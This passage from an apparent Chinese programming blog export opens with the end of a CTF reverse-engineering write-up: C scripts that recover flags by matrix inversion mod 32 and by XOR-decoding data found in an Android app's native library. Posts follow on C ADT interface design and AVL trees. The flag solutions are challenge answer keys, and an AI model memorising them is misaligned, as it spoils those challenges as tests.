&#125;</span></span><br><span class="line"><span class="comment">  puts(&quot;congratulation&quot;);</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据matrix矩阵求出的flag矩阵</span></span><br><span class="line">    <span class="comment">// flag为matrix矩阵模32下的逆阵</span></span><br><span class="line">    <span class="comment">// 参考https://www.cnblogs.com/lcbwwy/p/13125084.html</span></span><br><span class="line">    <span class="comment">// https://www.cnblogs.com/Higgerw/p/14464825.html#:~:text=%E6%A8%A1%E6%84%8F%E4%B9%89%E4%B8%8B%E7%9A%84%E9%80%86%E7%9F%A9%E9%98%B5%E8%AE%A1%E7%AE%97%20%E5%8F%82%E8%80%83%E8%87%AA%20https%3A%2F%2Fwww.cnblogs.com%2Flcbwwy%2Fp%2F13125084.html%20%E6%9C%80%E8%BF%91%E5%A4%8D%E4%B9%A0%E5%88%B0Hill%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95%EF%BC%8C%E6%B3%A8%E6%84%8F%E5%88%B0%E8%A7%A3%E5%AF%86%E6%A0%B8%E5%BF%83%E6%98%AF%E5%8F%AF%E9%80%86%E7%9A%84%E5%8A%A0%E5%AF%86%E7%9F%A9%E9%98%B5%20K%20K%20%E7%9A%84%E6%A8%A126%E6%84%8F%E4%B9%89%E4%B8%8B%E7%9A%84%E6%B1%82%E9%80%86%20K%E2%88%921,%EF%BC%8C%E8%BF%9B%E4%B8%80%E6%AD%A5%E8%AE%A1%E7%AE%97%E5%85%B6%E5%85%B3%E4%BA%8E26%E7%9A%84%E6%A8%A1%E9%80%86%20%7CK%7C%E2%88%921%20%7C%20K%20%7C%20%E2%88%92%201%20%E3%80%82</span></span><br><span class="line">    <span class="comment">// 利用网站https://zh.planetcalc.com/3324/</span></span><br><span class="line">    <span class="type">int</span> flag[<span class="number">5</span>][<span class="number">5</span>] = &#123;</span><br><span class="line">            <span class="number">11</span>, <span class="number">19</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">12</span>,</span><br><span class="line">            <span class="number">14</span>, <span class="number">6</span>, <span class="number">22</span>, <span class="number">27</span>, <span class="number">16</span>,</span><br><span class="line">            <span class="number">26</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">29</span>, <span class="number">11</span>,</span><br><span class="line">            <span class="number">4</span>, <span class="number">31</span>, <span class="number">22</span>, <span class="number">13</span>, <span class="number">8</span>,</span><br><span class="line">            <span class="number">27</span>, <span class="number">29</span>, <span class="number">10</span>, <span class="number">16</span>, <span class="number">16</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">char</span> table[] = <span class="string">&quot;01234_asdzxcpoityumnbAOZWXGMY&quot;</span>;</span><br><span class="line">    <span class="type">int</span> number[] = &#123;</span><br><span class="line">            <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">19</span>, <span class="number">22</span>, <span class="number">26</span>, <span class="number">27</span>,</span><br><span class="line">            <span class="number">28</span>, <span class="number">29</span>, <span class="number">31</span>, <span class="number">32</span>, <span class="number">50</span>, <span class="number">51</span>, <span class="number">52</span>, <span class="number">53</span>, <span class="number">54</span>, <span class="number">55</span>, <span class="number">56</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 输出方阵</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">5</span>; ++j) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">30</span>; k &lt;= <span class="number">127</span>; ++k) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> t = <span class="number">0</span>; t &lt; <span class="built_in">strlen</span>(table); ++t) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (table[t] == k) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (flag[i][j] == number[t]) &#123;</span><br><span class="line">                            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, k);</span><br><span class="line">                            index++;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// putchar(&#x27;\n&#x27;);</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n%d&quot;</span>, index);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="砍树">砍树</h2><p>安卓逆向,其实不难.</p><p>赛后很久后才写WP,没环境了,解题思路在解密脚本里了…</p><p>(路径parent_directory是我的个人隐私~doge)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * jadx中分析发现,加密方法public static native int I0o0I(String str, String str2);</span></span><br><span class="line"><span class="comment"> * 为 native 方法,所以需要去找对应的.so库</span></span><br><span class="line"><span class="comment"> * 使用`apktool.bat d 砍树.apk`命令进行反编译,在文件夹</span></span><br><span class="line"><span class="comment"> * parent_directory\砍树\lib\arm64-v8a</span></span><br><span class="line"><span class="comment"> * 中找到libezreeeee.so文件,使用IDA进行分析,最终发现使用key进行异或</span></span><br><span class="line"><span class="comment"> * 编写解密脚本即可</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> enc[] =</span><br><span class="line">            &#123;</span><br><span class="line">                    <span class="number">0</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">23</span>, <span class="number">27</span>, <span class="number">54</span>, <span class="number">14</span>, <span class="number">54</span>, <span class="number">38</span>, <span class="number">23</span>,</span><br><span class="line">                    <span class="number">4</span>, <span class="number">42</span>, <span class="number">41</span>, <span class="number">7</span>, <span class="number">38</span>, <span class="number">21</span>, <span class="number">82</span>, <span class="number">51</span>, <span class="number">45</span>, <span class="number">15</span>,</span><br><span class="line">                    <span class="number">58</span>, <span class="number">39</span>, <span class="number">17</span>, <span class="number">6</span>, <span class="number">51</span>, <span class="number">7</span>, <span class="number">70</span>, <span class="number">23</span>, <span class="number">61</span>, <span class="number">10</span>,</span><br><span class="line">                    <span class="number">60</span>, <span class="number">56</span>, <span class="number">46</span>, <span class="number">34</span>, <span class="number">24</span>, <span class="number">0</span></span><br><span class="line">            &#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> key[] = <span class="string">&quot;Sycloverforerver&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">35</span>; ++i) &#123;</span><br><span class="line">        enc[i] ^= key[i % <span class="number">7</span>];</span><br><span class="line">        <span class="built_in">putchar</span>(enc[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实现ADT接口的思想</title>
      <link href="/2023-12-04-7039f1f5de38/"/>
      <url>/2023-12-04-7039f1f5de38/</url>
      
        <content type="html"><![CDATA[<h1 id="创建adt对象的接口">创建ADT对象的接口</h1><p>有2种方法和一种不好的方法</p><h2 id="主调函数传递二级指针">主调函数传递二级指针</h2><p>假设我们有</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;ADT_TYPE;</span><br></pre></td></tr></table></figure><p>想要在main()函数中创建一个ADT_TYPE类型的对象,那么可以这样实现接口:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">create_ADT_TYPE</span><span class="params">(ADT_TYPE** objp)</span>&#123;</span><br><span class="line">    ADT_TYPE *temp = (ADT_TYPE*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(ADT_TYPE)); <span class="comment">// malloc</span></span><br><span class="line">    <span class="comment">// init ADT object</span></span><br><span class="line">    *objp = temp; <span class="comment">// Point *objp to temp</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    ADT_TYPE * obj;</span><br><span class="line">    create_ADT_TYPE(&amp;obj);</span><br><span class="line">    <span class="comment">// other operations</span></span><br><span class="line">    free_ADT_TYPE(obj);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>main()调用create_ADT_TYPE()时传递obj的指针,也就是一个二级指针,以达到在create_ADT_TYPE()直接修改obj指向的目的.</p><h2 id="接口函数返回对象指针">接口函数返回对象指针</h2><p>同样假设有:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;ADT_TYPE;</span><br></pre></td></tr></table></figure><p>想要在main()函数中创建一个ADT_TYPE类型的对象,那么可以这样实现接口:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ADT_TYPE* <span class="title function_">create_ADT_TYPE</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    ADT_TYPE *temp = (ADT_TYPE*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(ADT_TYPE)); <span class="comment">// malloc</span></span><br><span class="line">    <span class="comment">// init ADT object</span></span><br><span class="line">   <span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    ADT_TYPE * obj;</span><br><span class="line">    obj = create_ADT_TYPE();</span><br><span class="line">    <span class="comment">// other operations</span></span><br><span class="line">    free_ADT_TYPE(obj);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="全局静态指针">全局静态指针</h2><p>这样的写法很不好,这意味着一个程序只能创建一个ADT_TYPE的对象.</p><p>在ADT_TYPE.h中如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;ADT_TYPE;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">create_ADT_TYPE</span><span class="params">(<span class="type">void</span>)</span>;</span><br></pre></td></tr></table></figure><p>在ADT_TYPE.c中有如下实现:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> ADT_TYPE* glob_obj;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">create_ADT_TYPE</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    glob_obj = (ADT_TYPE*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(ADT_TYPE)); <span class="comment">// malloc</span></span><br><span class="line">    <span class="comment">// init ADT object</span></span><br><span class="line">    <span class="comment">// But directly manipulate the global static glob_obj variable</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">free_ADT_TYPE</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// other operations</span></span><br><span class="line">    <span class="built_in">free</span>(glob_obj);</span><br><span class="line">    glob_obj = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在main.c中如下使用该ADT:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;ADT_TYPE.h&quot;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    create_ADT_TYPE();</span><br><span class="line">    <span class="comment">// other operations</span></span><br><span class="line">    free_ADT_TYPE();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样写,用户代码(main()函数)仅仅只能依靠接口函数进行沟通,而且如果没有特殊的处理,最多只能创建一个对象,即glob_obj指向的对象.</p><h1 id="需要返回复合结果的操作接口">需要返回复合结果的操作接口</h1>]]></content>
      
      
      <categories>
          
          <category> 数据结构及算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> 数据结构 </tag>
            
            <tag> ADT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AVL树</title>
      <link href="/2023-12-01-27f7ad92dc6b/"/>
      <url>/2023-12-01-27f7ad92dc6b/</url>
      
        <content type="html"><![CDATA[<h1 id="avl树概述">AVL树概述</h1><p>AVL树(<code>Adelson-Velsky and Landis Tree</code>),得名与其发明者<a href="https://zh.wikipedia.org/wiki/%E6%A0%BC%E5%A5%A5%E5%B0%94%E5%90%89%C2%B7%E9%98%BF%E6%9D%B0%E5%B0%94%E6%9D%BE-%E9%9F%A6%E5%88%A9%E6%96%AF%E5%9F%BA">G. M. Adelson-Velsky</a>和<a href="https://zh.wikipedia.org/w/index.php?title=Evgenii_Landis&amp;action=edit&amp;redlink=1">Evgenii Landis</a>,是最早被发明的<code>自平衡二叉查找树</code>.在AVL树中，任一节点对应的两棵子树的最大高度差为1，因此它也被称为<code>高度平衡树</code>.</p><p>由于一般的二叉查找树,在极端情况下会退化成类似线性链表的结构,即变成一颗<code>左斜树</code>或<code>右斜树</code>,如图:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231201100107250.png" alt="image-20231201100107250" style="zoom:50%;" /><p>查找时间复杂度降低为O(n).使用<code>平衡树</code>可以解决这个问题,<code>AVL树</code>就是一种平衡树,其满足以下的几种性质:</p><ol><li>AVL树本身是一棵二叉搜索树</li><li>每一棵子树都是AVL树</li><li>平衡条件:每个节点的左右子树的高度之差(<code>平衡因子</code>)的绝对值不超过1,即平衡因子为1,0,-1的节点认为是平衡的.换句话说,任意节点的左右子树的最大高度之差为1.</li><li>查找、插入和删除在平均和最坏情况下的时间复杂度都是<code>O(logn)</code></li></ol><h1 id="前置知识">前置知识</h1><h2 id="树的旋转">树的旋转</h2><p>树的<code>旋转</code>用于调整子树的位置.</p><p>左(右)旋可以将根节点的左(右)子树移动到根的位置,将根节点&quot;旋转&quot;到原来左(右)子树的位置.</p><h3 id="旋转约定">旋转约定</h3><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231201103618570.png" alt="image-20231201103618570" style="zoom:50%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231201103815425.png" alt="image-20231201103815425" style="zoom:50%;" /><h3 id="旋转伪代码">旋转伪代码</h3><p><code>旋转</code>前后仍然满足是一棵二叉搜索树,因此可以写出旋转的伪代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">AVLNode</span>&#123;</span></span><br><span class="line">    AVLNode *left,*right;</span><br><span class="line">    <span class="comment">// 其他成员</span></span><br><span class="line">&#125;AVLNode;</span><br><span class="line">AVLNode *<span class="title function_">right_rotate</span><span class="params">(AVLNode *node)</span> &#123;</span><br><span class="line">    <span class="comment">// 三步操作</span></span><br><span class="line">    <span class="comment">// 注意left的右子树的位置变化</span></span><br><span class="line">    AVLNode *left = node-&gt;left;</span><br><span class="line">    node-&gt;left = left-&gt;right;</span><br><span class="line">    left-&gt;right = node;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> left;</span><br><span class="line">&#125;</span><br><span class="line">AVLNode *<span class="title function_">left_rotate</span><span class="params">(AVLNode *node)</span> &#123;</span><br><span class="line">    <span class="comment">// 三步操作</span></span><br><span class="line">    <span class="comment">// 注意right的左子树的位置变化</span></span><br><span class="line">    AVLNode *right = node-&gt;right;</span><br><span class="line">    node-&gt;right = right-&gt;left;</span><br><span class="line">    right-&gt;left = node;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> right;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果简单地将左(右)子节点移动到根,那么从图形上看会发现该节点的孩子变成了3个(原来的左右节点和移动后的根节点),此时就需要将其中一个子树(左旋为左子树,右旋为右子树)移动为根节点(此时已经不是树根)的孩子(左旋为其右子树,右旋为其左子树)</p><p>树的<code>旋转</code>可以调整左右子树的高度,可以将高度较小的子树下移,高度较大的子树上移.在平衡树中,用于调整(减小)左右子树的高度差.</p><h1 id="实现原理">实现原理</h1><h2 id="需要实现的操作">需要实现的操作</h2><p>实现一颗二叉平衡树需要实现如下操作:</p><ol><li>树的<code>左旋</code>和<code>右旋</code></li><li>向树中插入一个节点,并根据不同情况调整平衡</li><li>从树中删除一个节点,并根据不同情况调整平衡</li></ol><h2 id="什么时候需要旋转">什么时候需要旋转</h2><p>当树的节点发生了变化,即发生了插入或删除时,需要检查此时整个树是否仍然<code>平衡</code>,即左右子树高度差不超过1.</p><p>例如新增了一个节点7:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231201110219614.png" alt="image-20231201110219614" style="zoom:50%;" /><p>这说明插入/删除节点可能(不是一定)会导致树不再平衡,此时需要进行特定的<code>旋转</code>来重新平衡,当然,无论旋转与否,这棵树都是一棵合法的<code>二叉搜索树</code>,只不过不一定平衡而已.</p><p>下面讨论插入和删除的不同情况该如何旋转.</p><h2 id="avl树的插入操作">AVL树的插入操作</h2><p>首先会按照常规<code>二叉搜索树</code>的插入操作插入一个节点,然后从这个节点进行回溯,对每个回溯路径上的点判断其左右子树是否平衡,如果不平衡,即高度之差超过1,就要进行调整.</p><p>设当前的根节点为X,其左右孩子为XL,XR.XL和XR的子树依次为T1,T2,T3…</p><p>插入节点S后有如下4种情况需要进行旋转:</p><ol><li><p>X的左子树的高度比右子树大2,且S在XL的左子树上:</p> <img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231202105505144.png" alt="image-20231202105505144" style="zoom:50%;" /></li><li><p>X的右子树的高度比左子树大2,且S在XR的右子树上:</p> <img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231202110359679.png" alt="image-20231202110359679" style="zoom:50%;" /></li><li><p>X的左子树比右子树大2,且S在XL的右子树上:</p> <img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231202112334732.png" alt="image-20231202112334732" style="zoom:50%;" /></li><li><p>X右子树比左子树大2,且S在XR的左子树上:</p> <img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231202113619240.png" alt="image-20231202113619240" style="zoom:50%;" /></li></ol><p>以上4种情况中,1和2,3和4为左右对称的情况,仅仅是一个镜像.</p><p>读者需要自己尝试试验,或去考虑为什么需要这样旋转,总之,在代码中要分情况讨论,选择对应的旋转操作.</p><p>当然,如果高度差不超过1,则不需要进行任何旋转.</p><h2 id="avl树的删除操作">AVL树的删除操作</h2><p>插入(可能)会增加某棵子树的高度,而删除相反,相同的是,两种操作都可能影响高度差大于1,导致需要旋转调整.</p><p>同样,从删除后的节点进行回溯,按照上面的4中情况进行对应调整即可.</p><br><p>可以将要删除的节点不断向下旋转到叶子结点,最后删除该叶子节点.</p><br><p>另一种方法时,如果找到了删除节点S,有如下3种情况:</p><ol><li><p>S既有左子树,又有右子树.</p><p>找到右子树中最小的节点S2,用S2覆盖S,然后<code>递归</code>到右子树,这时问题转移为&quot;删除右子树中S2节点&quot;.</p><p>回溯回来后,要检查S(此时S的key已经被S2的key覆盖)的左右子树是否平衡,分情况选择是否旋转调整.</p></li><li><p>S只有左子树.</p><p>简单地把S删除,用S的左孩子(的指针)替换S(S的父亲的孩子指针)即可,即删除S这个树根.</p></li><li><p>S只有右子树.</p><p>简单地把S删除,用S的右孩子(的指针)替换S(S的父亲的孩子指针)即可,即删除S这个树根.</p></li></ol><p>注意上面的情况2,3可能是从情况1递归下来的,所以如果需要旋转调整,会返回到递归的上一层进行处理,即<code>回溯</code>.</p><p>另一方面,如果尚未找到,那么简单地作为<code>二叉搜索树</code>进行递归查找即可,回溯后进行(可能需要的)旋转调整.</p><h1 id="代码实现">代码实现</h1><p>本代码使用C语言编写.</p><p>头文件<code>AVLTree.h</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by WAHAHA on 2023/12/9.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> ADT_AVLTREE_AVLTREE_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ADT_AVLTREE_AVLTREE_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> true 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> false 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> <span class="keyword">error</span> -1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> status int</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> ElementType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">AVLNode</span> &#123;</span></span><br><span class="line">    ElementType data;</span><br><span class="line">    <span class="type">int</span> height;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">AVLNode</span> *<span class="title">left</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">AVLNode</span> *<span class="title">right</span>;</span></span><br><span class="line">&#125; AVLNode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    AVLNode *root;</span><br><span class="line">    <span class="comment">// int (*compare)(ElementType*, ElementType*); // 需要注册的比较函数</span></span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line">&#125; AVLTree;</span><br><span class="line"></span><br><span class="line"><span class="comment">// default compare function</span></span><br><span class="line"><span class="comment">// int defaultCompare(ElementType *a, ElementType *b);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// create and destroy</span></span><br><span class="line"><span class="comment">// AVLTree *AVLTreeCreate(int (*compare)(ElementType*, ElementType*));</span></span><br><span class="line">AVLTree *<span class="title function_">AVLTreeCreate</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">AVLTreeDestroy</span><span class="params">(AVLTree *tree)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">AVLTreeDestroyRun</span><span class="params">(AVLNode *node)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// insert and delete</span></span><br><span class="line">status <span class="title function_">AVLTreeInsert</span><span class="params">(AVLTree *tree, ElementType data)</span>;</span><br><span class="line">status <span class="title function_">AVLTreeInsertRun</span><span class="params">(AVLNode **root, ElementType data)</span>;</span><br><span class="line">status <span class="title function_">AVLTreeDelete</span><span class="params">(AVLTree *tree, ElementType data)</span>;</span><br><span class="line">status <span class="title function_">AVLTreeDeleteRun</span><span class="params">(AVLNode **root, ElementType data)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// search</span></span><br><span class="line">status <span class="title function_">AVLTreeSearch</span><span class="params">(AVLTree *tree, ElementType data)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// get max and min</span></span><br><span class="line">status <span class="title function_">AVLTreeGetMax</span><span class="params">(AVLTree *tree, ElementType *result)</span>;</span><br><span class="line">status <span class="title function_">AVLTreeGetMin</span><span class="params">(AVLTree *tree, ElementType *result)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// get status</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">AVLTreeGetHeight</span><span class="params">(AVLTree *tree)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">GetNodeHeight</span><span class="params">(AVLNode *node)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">AVLTreeGetSize</span><span class="params">(AVLTree *tree)</span>;</span><br><span class="line">status <span class="title function_">AVLTreeIsEmpty</span><span class="params">(AVLTree *tree)</span>;</span><br><span class="line">ElementType <span class="title function_">GetNodeMin</span><span class="params">(AVLNode *node)</span>;</span><br><span class="line">ElementType <span class="title function_">GetNodeMax</span><span class="params">(AVLNode *node)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// rotate</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">LeftRotation</span><span class="params">(AVLNode **node)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title 